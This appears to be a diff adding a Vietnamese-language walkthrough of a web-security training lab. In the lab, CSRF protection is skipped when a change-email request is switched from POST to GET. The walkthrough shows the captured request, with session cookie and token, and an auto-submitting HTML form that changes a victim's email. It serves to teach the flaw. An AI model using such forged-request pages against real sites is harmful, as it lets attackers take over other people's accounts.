@@ -1,0 +1,32 @@
+CSRF - CSRF where token validation depends on request method
+
+End Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
+You can log in to your own account using the following credentials: wiener:peter
+
+Analystic
+---------
+Bước 1: Mở Burp, copy link của lab hiện tại vào trình duyệt của burp và đăng nhập
+Bước 2: Thử thực hiện thay đổi email của mình, ta thấy có 1 request như sau:
+POST /my-account/change-email HTTP/2
+Host: 0a0300a0035648b681b5574f005a0039.web-security-academy.net
+Cookie: session=PN8NZJD8WXlfYZcmk7XCXW19z4vI2aVn
+......
+email=123%40gmail.com&csrf=CvEVYr63RLaoswFEerTp2u9SPtIauSGO
+Từ gói tin ta có những thông tin:
+method là POST
+endpoint là /my-account/change-email
+Có session id 
+khi đổi email cần có 2 giá trị: 1 là email mới, 2 là csrf
+Bước 3: 
+từ những thông tin đã biết, ta nhận thấy không thể mô phỏng 1 POST request, vì ta không thể lấy được giá trị csrf của mục tiêu, gửi request tới repeater, ta thử thay đổi method của request từ POST thành GET, ta không thấy method GET bị chặn và khi bỏ phần csrf, ta nhận thấy không có gì thay đổi --> GET của web này không yêu cầu csrf --> ta sẽ mô phỏng lại gói tin với method là GET đê thực hiện được bài lab này.
+Bước 4:
+vào exploit server, ta viết nội dung body của request như sau:
+<html>
+<body>
+<form action="url của lab"> --> không đặt method ở đây --> method được tự động hiểu là GET
+<input type="hidden" name="email" value="tmt@gmail.com>
+</form>
+<script> document.forms[0].submit();</script>
+</body>
+</html>
+--> ta sẽ gửi gói tin này cho người dùng từ 1 trang web mà ta kiểm soát --> ta không thể có csrf của người dùng nên đã sử dụng get 
